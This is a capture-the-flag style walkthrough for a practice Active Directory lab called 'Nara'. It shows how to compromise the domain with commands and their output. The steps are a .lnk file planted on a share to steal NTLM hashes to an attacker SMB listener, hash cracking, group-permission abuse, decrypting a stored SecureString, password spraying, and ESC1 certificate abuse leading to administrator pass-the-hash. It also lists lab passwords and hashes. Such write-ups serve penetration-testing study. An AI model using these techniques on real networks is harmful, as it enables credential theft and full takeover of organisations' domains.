____

# Nara (OSEP-Level)

## Credentials

Administrator/DSRM: RadioUnsecuredQuaking00 Jodie Summers: hHO_S9gff7ehXw Tracy White: zqwj041FGX

proof.txt : 74acc5afc945b0466f0f8a17e7785ac6 (On Administrator) local.txt : d2ad2c8a2dc3c0ae33b7b96951f3626d (On Tracy)

## Walkthrough

```
sudo nmap -sV 172.16.201.26
[sudo] password for xct:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-02 19:43 CEST
Nmap scan report for 172.16.201.26
Host is up (0.11s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-02 17:43:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: NARA; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.08 seconds
```

Add to /etc/hosts: nara-security.com, then enumerate shares:

```
smbclient -L \nara-security.com
Password for [WORKGROUPxct]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nara            Disk      company share
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to nara-security.com failed (Error NT_STATUS_HOST_UNREACHABLE)
Unable to connect with SMB1 -- no workgroup available

smbclient \\nara-security.com\nara
Password for [WORKGROUPxct]:
Try "help" to get a list of possible commands.
smb: > ls
  .                                   D        0  Sun Jul 30 16:31:58 2023
  ..                                DHS        0  Sun Jul 30 16:46:51 2023
  Documents                           D        0  Sun Jul 30 16:03:13 2023
  Important.txt                       A     2200  Sun Jul 30 16:05:31 2023
  IT                                  D        0  Sun Jul 30 18:22:50 2023
```

Important.txt shows a company message that every employee is supposed to check the Documents folder regulary (for new compliance documents). We can mount a hash stealing attack by placing a .lnk file and listening with impacket's smbserver.

```
# https://github.com/xct/hashgrab
python3 ~/tools/hashgrab/hashgrab.py 10.9.1.18 xct

impacket-smbserver share share -smb2support

put @xct.lnk
```

Hash will come:

```
[*] Tracy.White::NARASEC:aaaaaaaaaaaaaaaa:84387905bda9c7db82e1616338dfaf32:0101000000000000802770856cc5d9014a531f4d2ec72fd5000000000100100062006a006f006e006400690070006e000300100062006a006f006e006400690070006e0002001000790074006700760074004d006400790004001000790074006700760074004d006400790007000800802770856cc5d9010600040002000000080030003000000000000000010000000020000043be9e4206b100be35271b993dd1189be857cb403801724172ef776f1d4486130a0010000000000000000000000000000000000009001c0063006900660073002f00310030002e0039002e0031002e00310038000000000000000000
```

Crack the hash via hashcat:

```
hashcat -m 5600 -a0 hash /usr/share/wordlists/rockyou.txt  --force

TRACY.WHITE::NARASEC:aaaaaaaaaaaaaaaa:da87a69ed90a11dc933ad1163c96d894:01010000000000000053c3906cc5d901fc1f5779bd994b61000000000100100062006a006f006e006400690070006e000300100062006a006f006e006400690070006e0002001000790074006700760074004d006400790004001000790074006700760074004d0064007900070008000053c3906cc5d9010600040002000000080030003000000000000000010000000020000043be9e4206b100be35271b993dd1189be857cb403801724172ef776f1d4486130a0010000000000000000000000000000000000009001c0063006900660073002f00310030002e0039002e0031002e00310038000000000000000000:zqwj041FGX
```

Run bloodhound with these new domain user creds:

```
cme ldap nara.nara-security.com -u Tracy.White -p 'zqwj041FGX' --bloodhound -c all -ns 172.16.201.26
```

Reachable High Value Targets shows an attack path from tracy.white to the DC. She has GenericAll on the Remote Access Group, which in turn can PSRemote into the DC. So we add ourselves to the group and can then get a shell on the Domain Controller:

```
# https://github.com/franc-pentest/ldeep.git
python3 __main__.py ldap -u tracy.white -p 'zqwj041FGX' -d nara-security.com -s ldap://nara-security.com add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"

[+] User CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM sucessfully added to CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM
```

```
evil-winrm -u tracy.white -i nara.nara-security.com
```

Read the flag on the users desktop and automation.txt in "C:UsersTracy.WhiteDocuments".

```
*Evil-WinRM* PS C:Users	racy.whiteDocuments> type ..Desktoplocal.txt
...

type automation.txt
Enrollment Automation Account

01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b
```

This is microsofts recommended way to store credentials for automation purposes, lets try to decrypt them. First save the string in a new file (without the first line), then:

```
$pw = Get-Content .creds.txt | ConvertTo-SecureString
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)
$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
$UnsecurePassword

hHO_S9gff7ehXw
```

We don't know which user this is for though. The "Enrollment Automation Account" hints at a user from the enrollment group (or you just spray) which only has 3 users, Jemma, Jodie & Jasmine.

```
cme smb nara-security.com -u JEMMA.HUMPHRIES -p 'hHO_S9gff7ehXw' 
SMB         172.16.201.26   445    NARA             [-] nara-security.comJemma.Humphries:hHO_S9gff7ehXw STATUS_LOGON_FAILURE

cme smb nara-security.com -u JASMINE.ROBERTS -p 'hHO_S9gff7ehXw'
SMB         172.16.201.26   445    NARA             [-] nara-security.comJasmine.Roberts:hHO_S9gff7ehXw STATUS_LOGON_FAILURE

cme smb nara-security.com -u JODIE.SUMMERS -p 'hHO_S9gff7ehXw'
SMB         172.16.201.26   445    NARA             [*] Windows 10.0 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:False)
SMB         172.16.201.26   445    NARA             [+] nara-security.comJODIE.SUMMERS:hHO_S9gff7ehXw
```

Enrollment leads us to certificates and there is infact a CA on the Domain Controller. We can gather additional bloodhound data from any domain user:

```
certipy-ad find -u JODIE.SUMMERS -p 'hHO_S9gff7ehXw' -dc-ip nara-security.com  -dns-tcp -ns 172.16.201.26 -bloodhound
...
[*] Got CA configuration for 'NARA-CA'
[*] Saved BloodHound data to '20230802203609_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
```

This shows that the Enrollment group as GenericAll on the NARAUSER template, which is also known as the ESC4 scenario (full control over a template). Additionally any user supplied subject is allowed, so it is also directly vulnerable to ESC1 from any user in the enrollment group.

```
certipy-ad req -username JODIE.SUMMERS -password 'hHO_S9gff7ehXw' -target nara-security.com -ca NARA-CA -template NARAUSER -upn administrator@nara-security.com -dc-ip 172.16.201.26 -debug
...
[*] Saved certificate and private key to 'administrator.pfx'


certipy auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 172.16.201.26
...
[*] Got hash for 'administrator@nara-security.com': aad3b435b51404eeaad3b435b51404ee:d35c4ae45bdd10a4e28ff529a2155745

```

Now we can pass the hash as administrator via WinRM and read the final flag:

```
evil-winrm -u administrator -i nara-security.com -H d35c4ae45bdd10a4e28ff529a2155745
```
